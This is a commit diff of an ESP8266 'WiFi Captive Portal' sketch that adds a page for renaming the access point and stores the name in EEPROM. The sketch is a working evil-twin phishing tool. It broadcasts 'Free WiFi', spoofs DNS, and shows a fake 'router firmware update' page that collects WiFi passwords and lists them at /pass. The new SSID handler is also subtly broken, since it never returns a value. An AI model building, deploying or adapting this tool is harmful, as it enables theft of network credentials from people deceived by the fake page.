5833cab98fccf2b37f59893a3ead583000e2fa15
125K <bluearduino20@gmail.com>
2020-04-25 21:43:53 +0200

    Added "172.0.0.1/ssid" to change SSID on the go.
    Added "172.0.0.1/ssid" to change the SSID name on the go, without having to reupload the code.

--- WiFi_Captive_Portal.ino
+++ WiFi_Captive_Portal.ino
@@ -1,14 +1,16 @@
 // ESP8266 WiFi Captive Portal
-// By BlueArduino20
-// Based on: PopupChat https://github.com/tlack/popup-chat
+// By 125K (github.com/125K)
 
-// Includes
+// Libraries
 #include <ESP8266WiFi.h>
 #include <DNSServer.h> 
 #include <ESP8266WebServer.h>
+#include <EEPROM.h>
 
-// User configuration
-#define SSID_NAME "My SSID"
+// Default SSID name
+const char* SSID_NAME = "Free WiFi";
+
+// Default main strings
 #define SUBTITLE "Router info."
 #define TITLE "Update"
 #define BODY "Your router firmware is out of date. Update your firmware to continue browsing normally."
@@ -17,13 +19,15 @@
 #define PASS_TITLE "Passwords"
 #define CLEAR_TITLE "Cleared"
 
-// Init System Settings
+// Init system settings
 const byte HTTP_CODE = 200;
 const byte DNS_PORT = 53;
 const byte TICK_TIMER = 1000;
 IPAddress APIP(172, 0, 0, 1); // Gateway
 
-String allPass="";
+String allPass = "";
+String newSSID = "";
+
 unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
 DNSServer dnsServer; ESP8266WebServer webServer(80);
 
@@ -32,8 +36,8 @@ String input(String argName) {
   a.replace("<","&lt;");a.replace(">","&gt;");
   a.substring(0,200); return a; }
 
-String footer() { return 
-  "</div><div class=q><a>&#169; All rights reserved.</a></div>";
+String footer() { 
+  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
 }
 
 String header(String t) {
@@ -48,15 +52,11 @@ String header(String t) {
     "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
     "textarea { width: 100%; }";
   String h = "<!DOCTYPE html><html>"
-    "<head><title>"+a+" :: "+t+"</title>"
+    "<head><title>" + a + " :: " + t + "</title>"
     "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
-    "<style>"+CSS+"</style></head>"
-    "<body><nav><b>"+a+"</b> "+SUBTITLE+"</nav><div><h1>"+t+"</h1></div><div>";
+    "<style>" + CSS + "</style></head>"
+    "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
   return h; }
-
-String pass() {
-  return header(PASS_TITLE) + "<ol>"+allPass+"</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
-}
 
 String index() {
   return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>WiFi password:</label>"+
@@ -64,16 +64,34 @@ String index() {
 }
 
 String posted() {
-  String pass=input("m"); allPass="<li><b>"+pass+"</b></li>"+allPass;
+  String pass = input("m"); allPass = "<li><b>" + pass + "</b></li>" + allPass;
   return header(POST_TITLE) + POST_BODY + footer();
 }
 
+String pass() {
+  return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
+}
+
+String ssid() {
+  return header(TITLE) + "<p>Here you can change the SSID name. After pressing the button \"Change SSID\" you will lose the connection, so reconnect to the new SSID.</p>" + "<form action=/postSSID method=post><label>New SSID name:</label>"+
+    "<input type=text name=s></input><input type=submit value=Change SSID></form>" + footer();
+}
+
+String postedSSID() {
+  String postedSSID = input("s"); newSSID="<li><b>" + postedSSID + "</b></li>";
+  for (int i = 0; i < postedSSID.length(); ++i)
+  {
+    EEPROM.write(i, postedSSID[i]);
+  }
+  WiFi.softAP(postedSSID);
+}
+
 String clear() {
-  String pass="<p></p>"; allPass="<p></p>";
+  String pass=""; allPass = "";
   return header(CLEAR_TITLE) + "<div><p>The password list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
 }
 
-void BLINK() { // The internal LED will blink 5 times when a password is received.
+void BLINK() { // The built-in LED will blink 5 times after a password is posted.
   int count = 0;
   while(count < 5){
     digitalWrite(BUILTIN_LED, LOW);
@@ -86,15 +104,37 @@ void BLINK() { // The internal LED will blink 5 times when a password is receive
 
 void setup() {
   bootTime = lastActivity = millis();
+  EEPROM.begin(512);
+  delay(10);
+  
+  // Read EEPROM SSID
+  String ESSID;
+  for (int i = 0; i < 32; ++i)
+  {
+    ESSID += char(EEPROM.read(i));
+  }
+  
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
-  WiFi.softAP(SSID_NAME);
-  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)
+
+  // Check if EEPROM SSID is empty
+  if (ESSID == "") {
+    WiFi.softAP(SSID_NAME);
+  } else {
+    WiFi.softAP(ESSID); // If it's empty, use the default SSID
+  }
+
+  // Start webserver
+  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only for HTTP)
   webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
+  webServer.on("/ssid",[]() { webServer.send(HTTP_CODE, "text/html", ssid()); });
+  webServer.on("/postSSID",[]() { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
   webServer.on("/pass",[]() { webServer.send(HTTP_CODE, "text/html", pass()); });
   webServer.on("/clear",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });
   webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
   webServer.begin();
+
+  // Enable the built-in LED
   pinMode(BUILTIN_LED, OUTPUT);
   digitalWrite(BUILTIN_LED, HIGH);
 }
